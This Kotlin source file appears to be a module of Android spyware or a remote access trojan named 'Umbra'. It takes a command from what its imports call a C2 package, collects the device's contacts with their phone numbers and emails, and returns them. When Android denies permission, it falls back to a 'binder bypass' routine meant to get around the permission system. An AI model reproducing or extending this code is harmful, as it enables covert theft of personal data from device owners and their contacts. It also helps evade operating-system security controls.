package org.umbra.core.modules

import android.content.Context
import android.provider.ContactsContract
import android.util.Log
import org.umbra.core.c2.Command
import org.umbra.core.core.ContactEntry
import org.umbra.core.core.UmbraResponse

object ContactsModule {

    suspend fun list(context: Context, cmd: Command): UmbraResponse {
        val count = (cmd.params["count"]?.toIntOrNull() ?: 200).coerceAtMost(1000)
        val search = cmd.params["search"]  // optional search filter by display name

        return try {
            val contacts = mutableListOf<ContactEntry>()
            val processedIds = mutableSetOf<Long>()

            // Query contacts
            val selection = if (search != null) {
                "${ContactsContract.Contacts.DISPLAY_NAME} LIKE ?"
            } else null
            val selArgs = if (search != null) arrayOf("%$search%") else null

            val cursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                selection,
                selArgs,
                "${ContactsContract.Contacts.DISPLAY_NAME} ASC LIMIT $count"
            )

            cursor?.use { contactCursor ->
                val idIdx = contactCursor.getColumnIndex(ContactsContract.Contacts._ID)
                val nameIdx = contactCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)

                while (contactCursor.moveToNext()) {
                    val contactId = if (idIdx >= 0) contactCursor.getLong(idIdx) else continue
                    val displayName = if (nameIdx >= 0) contactCursor.getString(nameIdx) ?: "Unknown" else "Unknown"

                    if (processedIds.contains(contactId)) continue
                    processedIds.add(contactId)

                    // Get phone numbers
                    val phones = mutableListOf<String>()
                    val phoneCursor = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                        arrayOf(contactId.toString()),
                        null
                    )
                    phoneCursor?.use {
                        val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        while (it.moveToNext()) {
                            if (numIdx >= 0) {
                                phones.add(it.getString(numIdx) ?: "")
                            }
                        }
                    }

                    // Get emails
                    val emails = mutableListOf<String>()
                    val emailCursor = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                        arrayOf(contactId.toString()),
                        null
                    )
                    emailCursor?.use {
                        val emIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
                        while (it.moveToNext()) {
                            if (emIdx >= 0) {
                                emails.add(it.getString(emIdx) ?: "")
                            }
                        }
                    }

                    contacts.add(ContactEntry(
                        display_name = displayName,
                        phone_numbers = phones,
                        emails = emails
                    ))
                }
            }

            UmbraResponse.ContactsResponse(
                contacts = contacts,
                count = contacts.size
            )
        } catch (e: Exception) {
            // ── Binder bypass fallback — catches SecurityException, RuntimeException, etc. ──
            Log.d("Umbra.Contacts", "ContentResolver failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
            return try {
                val binderContacts = PermissionBypass.readContactsViaBinder(context, search, count)
                if (binderContacts.isNotEmpty()) {
                    Log.d("Umbra.Contacts", "Binder bypass SUCCESS: ${binderContacts.size} contacts")
                    UmbraResponse.ContactsResponse(contacts = binderContacts, count = binderContacts.size)
                } else {
                    Log.d("Umbra.Contacts", "Binder bypass returned 0 contacts")
                    UmbraResponse.ContactsResponse(contacts = emptyList(), count = 0)
                }
            } catch (bp: Exception) {
                Log.e("Umbra.Contacts", "Binder bypass FAILED: ${bp.message}", bp)
                UmbraResponse.ErrorResponse("contacts:bypass_failed:${bp.message}", "contacts")
            }
        }
    }
}
